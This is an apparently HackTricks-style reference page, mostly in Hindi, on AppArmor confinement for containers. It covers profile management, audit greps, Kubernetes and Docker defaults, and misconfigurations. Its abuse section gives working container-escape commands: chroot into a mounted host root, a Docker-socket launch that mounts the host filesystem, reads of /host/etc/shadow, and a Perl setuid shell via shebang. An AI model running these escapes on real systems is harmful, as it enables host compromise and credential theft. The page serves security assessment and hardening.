# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

AppArmor एक **Mandatory Access Control** सिस्टम है जो per-program profiles के माध्यम से प्रतिबंध लागू करता है। पारंपरिक DAC चेक्स के विपरीत, जो उपयोगकर्ता और समूह के मालिकाने पर बहुत निर्भर करते हैं, AppArmor kernel को उस process से जुड़ी policy लागू करने देता है। container environments में यह इसलिए महत्वपूर्ण है क्योंकि किसी workload के पास पारंपरिक privileges किसी क्रिया का प्रयास करने के लिए पर्याप्त हो सकते हैं और फिर भी उसे रोका जा सकता है क्योंकि उसके AppArmor profile में संबंधित path, mount, network व्यवहार, या capability उपयोग की अनुमति नहीं है।

सबसे महत्वपूर्ण वैचारिक बात यह है कि AppArmor **path-based** है। यह filesystem access को labels की बजाय path नियमों के माध्यम से नियंत्रित करता है, जैसा कि SELinux में होता है। इससे यह उपयोग में आसान और शक्तिशाली बनता है, पर इसका यह भी अर्थ है कि bind mounts और वैकल्पिक path लेआउट पर सावधानी से ध्यान देना चाहिए। यदि वही host content किसी अलग path के तहत पहुँच योग्य हो जाता है, तो policy का प्रभाव ऑपरेटर की पहली अपेक्षा जैसा नहीं हो सकता।

## कंटेनर अलगाव में भूमिका

Container security reviews अक्सर capabilities और seccomp तक ही रुक जाती हैं, पर AppArmor उन चेक्स के बाद भी मायने रखता है। कल्पना करें कि एक container के पास चाहिए से अधिक privilege है, या किसी workload को operational कारणों से एक अतिरिक्त capability की जरूरत थी। AppArmor फिर भी फ़ाइल एक्सेस, mount व्यवहार, नेटवर्किंग, और execution पैटर्न को ऐसे तरीके से सीमित कर सकता है जो स्पष्ट दुरुपयोग मार्ग को रोकते हैं। यही वजह है कि AppArmor को "सिर्फ़ application को काम करने के लिए" डिसेबल करना किसी केवल जोखिम भरे कॉन्फ़िगरेशन को चुपचाप एक सक्रिय रूप से शोषणीय स्थिति में बदल सकता है।

## लैब

यह जाँचने के लिए कि AppArmor होस्ट पर सक्रिय है या नहीं, उपयोग करें:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
यह देखने के लिए कि वर्तमान container process किस के अंतर्गत चल रहा है:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
यह फर्क शिक्षाप्रद है। सामान्य मामले में, प्रक्रिया को रनटाइम द्वारा चुनी गई प्रोफ़ाइल से जुड़ा AppArmor context दिखाना चाहिए। unconfined स्थिति में वह अतिरिक्त प्रतिबंध परत गायब हो जाती है।

आप यह भी देख सकते हैं कि Docker ने क्या लागू किया हुआ माना है:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## रनटाइम उपयोग

यदि होस्ट इसका समर्थन करता है तो Docker डिफ़ॉल्ट या कस्टम AppArmor प्रोफ़ाइल लागू कर सकता है। Podman भी AppArmor-आधारित सिस्टमों पर AppArmor के साथ एकीकृत हो सकता है, हालांकि SELinux-प्राथमिक वितरणों में दूसरा MAC सिस्टम अक्सर मुख्य भूमिका ले लेता है। Kubernetes उन नोड्स पर जो वास्तव में AppArmor को सपोर्ट करते हैं, workload स्तर पर AppArmor नीति उजागर कर सकता है। LXC और संबंधित Ubuntu-परिवार के system-container वातावरण भी AppArmor का व्यापक उपयोग करते हैं।

व्यावहारिकतः AppArmor कोई "Docker feature" नहीं है। यह एक host-kernel फीचर है जिसे कई runtimes लागू करने का विकल्प चुन सकते हैं। अगर होस्ट इसका समर्थन नहीं करता या runtime को unconfined चलाने के लिए कहा गया है, तो कथित सुरक्षा वास्तव में मौजूद नहीं होती।

Kubernetes के लिए विशेष रूप से, आधुनिक API `securityContext.appArmorProfile` है। Kubernetes `v1.30` के बाद से पुराने beta AppArmor annotations deprecated हैं। समर्थित होस्ट्स पर, `RuntimeDefault` डिफ़ॉल्ट प्रोफ़ाइल है, जबकि `Localhost` उस प्रोफ़ाइल की ओर इशारा करता है जिसे पहले से नोड पर लोड किया जाना चाहिए। यह समीक्षा के दौरान महत्वपूर्ण है क्योंकि एक manifest AppArmor-सूचित दिख सकता है पर फिर भी पूरी तरह नोड-साइड समर्थन और प्रीलोडेड प्रोफ़ाइल्स पर निर्भर हो सकता है।

एक महीन लेकिन उपयोगी ऑपरेशनल विवरण यह है कि स्पष्ट रूप से `appArmorProfile.type: RuntimeDefault` सेट करना केवल फ़ील्ड को छोड़ने की तुलना में कड़ा होता है। यदि फ़ील्ड स्पष्ट रूप से सेट है और नोड AppArmor को सपोर्ट नहीं करता, तो admission असफल होना चाहिए। यदि फ़ील्ड छोड़ा गया है, तो workload फिर भी ऐसे नोड पर चल सकता है जिसमें AppArmor नहीं है और बस वह अतिरिक्त confinement परत प्राप्त नहीं करेगा। एक आक्रमणकर्ता के दृष्टिकोण से, यह manifest और वास्तविक नोड स्टेट दोनों की जाँच करने का एक अच्छा कारण है।

Docker-capable AppArmor होस्ट्स पर, सबसे जाना-माना डिफ़ॉल्ट `docker-default` है। यह प्रोफ़ाइल Moby के AppArmor टेम्पलेट से जनरेट होती है और महत्वपूर्ण है क्योंकि यह समझाती है कि क्यों कुछ capability-आधारित PoCs अभी भी डिफ़ॉल्ट container में फेल होते हैं। व्यापक रूप से, `docker-default` सामान्य networking की अनुमति देता है, `/proc` के कई हिस्सों में लिखना रोकता है, `/sys` के संवेदनशील हिस्सों तक पहुँच अस्वीकार करता है, mount ऑपरेशन्स को ब्लॉक करता है, और ptrace को ऐसे प्रतिबंधित करता है कि यह सामान्य host-probing primitive न रहे। उस बेसलाइन को समझना यह अलग करने में मदद करता है कि "container के पास `CAP_SYS_ADMIN` है" और "container वास्तव में उस capability का उपयोग कर सकता है जो kernel interfaces पर मुझे चाहिए"।

## प्रोफ़ाइल प्रबंधन

AppArmor प्रोफ़ाइल सामान्यतः `/etc/apparmor.d/` के अंतर्गत स्टोर होती हैं। एक सामान्य नामकरण कन्वेंशन यह है कि executable path में slashes को dots से बदल दिया जाए। उदाहरण के लिए, `/usr/bin/man` के लिए एक प्रोफ़ाइल आमतौर पर `/etc/apparmor.d/usr.bin.man` के रूप में स्टोर होती है। यह विवरण रक्षा और आकलन दोनों के दौरान महत्वपूर्ण है क्योंकि एक बार जब आप सक्रिय प्रोफ़ाइल नाम जान लेते हैं, तो आप अक्सर संबंधित फ़ाइल को होस्ट पर जल्दी से ढूँढ़ सकते हैं।

उपयोगी होस्ट-साइड प्रबंधन कमांड्स शामिल हैं:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
The reason these commands matter in a container-security reference is that they explain how profiles are actually built, loaded, switched to complain mode, and modified after application changes. If an operator has a habit of moving profiles into complain mode during troubleshooting and forgetting to restore enforcement, the container may look protected in documentation while behaving much more loosely in reality.

### प्रोफाइल बनाना और अपडेट करना

`aa-genprof` एप्लिकेशन के व्यवहार का निरीक्षण कर सकता है और इंटरैक्टिव रूप से एक profile जनरेट करने में मदद कर सकता है:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` एक टेम्पलेट प्रोफ़ाइल जेनरेट कर सकता है जिसे बाद में `apparmor_parser` के साथ लोड किया जा सकता है:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
जब बाइनरी बदलती है और पॉलिसी को अपडेट करने की आवश्यकता होती है, `aa-logprof` लॉग में मिलने वाले denials को replay कर सकता है और ऑपरेटर को यह निर्णय लेने में मदद कर सकता है कि उन्हें allow करना है या deny करना है:
```bash
sudo aa-logprof
```
### लॉग

AppArmor अस्वीकृतियाँ अक्सर `auditd`, syslog, या `aa-notify` जैसे टूल्स के माध्यम से दिखाई देती हैं:
```bash
sudo aa-notify -s 1 -v
```
यह संचालनात्मक और आक्रामक दोनों रूपों में उपयोगी है। रक्षक इसका उपयोग profiles को परिष्कृत करने के लिए करते हैं। हमलावर इसका उपयोग यह जानने के लिए करते हैं कि कौन सा सटीक पथ या ऑपरेशन नकारा जा रहा है और क्या AppArmor exploit chain को ब्लॉक कर रहा है।

### सटीक प्रोफ़ाइल फ़ाइल की पहचान

जब किसी runtime में container के लिए एक विशिष्ट AppArmor प्रोफ़ाइल नाम दिखता है, तो अक्सर उस नाम को डिस्क पर प्रोफ़ाइल फ़ाइल से मैप करना उपयोगी होता है:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
यह खास तौर पर होस्ट-साइड समीक्षा के दौरान उपयोगी है क्योंकि यह "the container says it is running under profile `lowpriv`" और "the actual rules live in this specific file that can be audited or reloaded" के बीच की खाई को पाटता है।

### ऑडिट करने के लिए उच्च-सिग्नल नियम

जब आप किसी profile को पढ़ सकते हों, तो सरल `deny` लाइनों पर रुकें नहीं। कई rule प्रकार materially बदल देते हैं कि AppArmor container escape प्रयास के खिलाफ कितना उपयोगी होगा:

- `ux` / `Ux`: execute the target binary unconfined. अगर किसी reachable helper, shell, या interpreter को `ux` के तहत allowed है, तो आमतौर पर यह पहला चीज़ होती है जिसे टेस्ट करना चाहिए।
- `px` / `Px` और `cx` / `Cx`: exec पर profile transitions perform करते हैं। ये स्वचालित रूप से खराब नहीं हैं, पर इन्हें audit करना चाहिए क्योंकि एक transition वर्तमान profile की तुलना में कहीं अधिक व्यापक profile में land कर सकता है।
- `change_profile`: एक task को दूसरे loaded profile में switch करने की अनुमति देता है, तुरंत या अगले exec पर। अगर destination profile कमजोर है, तो यह restrictive domain से intended escape hatch बन सकता है।
- `flags=(complain)`, `flags=(unconfined)`, या नया `flags=(prompt)`: ये तय करते हैं कि आप profile पर कितना विश्वास रखें। `complain` denials को enforce करने के बजाय log करता है, `unconfined` सीमा हटा देता है, और `prompt` pure kernel-enforced deny के बजाय userspace decision path पर निर्भर करता है।
- `userns` या `userns create,`: नया AppArmor policy user namespaces के creation को mediate कर सकता है। अगर कोई container profile इसे स्पष्ट रूप से allow करता है, तो nested user namespaces प्ले में रहते हैं भले ही platform AppArmor को अपनी hardening strategy के हिस्से के रूप में इस्तेमाल कर रहा हो।

उपयोगी होस्ट-साइड grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
This kind of audit is often more useful than staring at hundreds of ordinary file rules. If a breakout depends on executing a helper, entering a new namespace, or escaping into a less restrictive profile, the answer is often hidden in these transition-oriented rules rather than in the obvious `deny /etc/shadow r` style lines.

## गलत कॉन्फ़िगरेशन

The most obvious mistake is `apparmor=unconfined`. Administrators often set it while debugging an application that failed because the profile correctly blocked something dangerous or unexpected. If the flag remains in production, the entire MAC layer has effectively been removed.

Another subtle problem is assuming that bind mounts are harmless because the file permissions look normal. Since AppArmor is path-based, exposing host paths under alternate mount locations can interact badly with path rules. A third mistake is forgetting that a profile name in a config file means very little if the host kernel is not actually enforcing AppArmor.

## दुरुपयोग

When AppArmor is gone, operations that were previously constrained may suddenly work: reading sensitive paths through bind mounts, accessing parts of procfs or sysfs that should have remained harder to use, performing mount-related actions if capabilities/seccomp also permit them, or using paths that a profile would normally deny. AppArmor is often the mechanism that explains why a capability-based breakout attempt "should work" on paper but still fails in practice. Remove AppArmor, and the same attempt may start succeeding.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
यदि container में `CAP_SYS_ADMIN` जैसी खतरनाक capability भी है, तो सबसे व्यावहारिक परीक्षणों में से एक यह है कि क्या AppArmor mount operations या संवेदनशील kernel filesystems तक पहुँच को ब्लॉक कर रहा है:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ऐसे वातावरणों में जहाँ एक host path पहले से ही bind mount के माध्यम से उपलब्ध है, AppArmor के खो जाने से एक read-only information-disclosure समस्या सीधे host file access में बदल सकती है:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
इन कमांड्स का उद्देश्य यह नहीं है कि AppArmor अकेले ही breakout बनाता है। मकसद यह है कि एक बार AppArmor हटा दिया जाए तो कई फ़ाइल सिस्टम और माउंट-आधारित दुरुपयोग पथ तुरंत परीक्षण योग्य हो जाते हैं।

### पूरा उदाहरण: AppArmor अक्षम + होस्ट रूट माउंट किया गया

यदि container में पहले से ही होस्ट रूट `/host` पर bind-mounted है, तो AppArmor हटाने से एक ब्लॉक किया गया फ़ाइल सिस्टम दुरुपयोग पथ पूर्ण host escape में बदल सकता है:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
एक बार shell host filesystem के माध्यम से execute कर रहा है, workload प्रभावी रूप से container boundary से बाहर निकल चुका है:
```bash
id
hostname
cat /etc/shadow | head
```
### पूर्ण उदाहरण: AppArmor Disabled + Runtime Socket

यदि वास्तविक बाधा runtime state के चारों ओर AppArmor थी, तो एक mounted socket पूर्ण escape के लिए पर्याप्त हो सकता है:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
सटीक पथ माउंट पॉइंट पर निर्भर करता है, लेकिन अंतिम परिणाम वही रहता है: AppArmor अब runtime API तक पहुँच को रोक नहीं रहा है, और runtime API एक host-compromising container लॉन्च कर सकता है।

### पूर्ण उदाहरण: Path-Based Bind-Mount Bypass

क्योंकि AppArmor पथ-आधारित है, `/proc/**` की सुरक्षा स्वतः ही उसी होस्ट procfs सामग्री की सुरक्षा नहीं करती जब वह किसी अलग पथ से पहुँचा जा सके:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
प्रभाव इस बात पर निर्भर करता है कि असल में क्या माउंट किया गया है और क्या वैकल्पिक पाथ अन्य नियंत्रणों को भी बायपास करता है; लेकिन यह पैटर्न AppArmor को पृथक रूप से नहीं बल्कि माउंट लेआउट के साथ मिलकर मूल्यांकन करने का सबसे स्पष्ट कारणों में से एक है।

### पूरा उदाहरण: Shebang Bypass

AppArmor नीति कभी-कभी इंटरप्रेटर पथ को इस तरह लक्षित करती है कि shebang हैंडलिंग के माध्यम से स्क्रिप्ट निष्पादन को पूरी तरह ध्यान में नहीं रखा जाता। एक ऐतिहासिक उदाहरण एक ऐसी स्क्रिप्ट के उपयोग से जुड़ा था जिसकी पहली पंक्ति एक संकुचित इंटरप्रेटर की ओर इशारा करती थी:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
यह उदाहरण इस बात की याद दिलाने के लिए महत्वपूर्ण है कि profile का इरादा और वास्तविक execution semantics अलग हो सकते हैं। जब AppArmor को container परिवेशों में समीक्षा किया जा रहा हो, तो interpreter chains और alternate execution paths पर विशेष ध्यान दिया जाना चाहिए।

## Checks

इन जाँचों का उद्देश्य तीन प्रश्नों का शीघ्र उत्तर देना है: क्या AppArmor host पर enabled है, क्या वर्तमान process confined है, और क्या runtime ने वास्तव में इस container पर कोई profile लागू किया?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, the runtime or orchestrator configuration is not enough by itself.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, the practical boundary may be much weaker than the profile name suggests.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
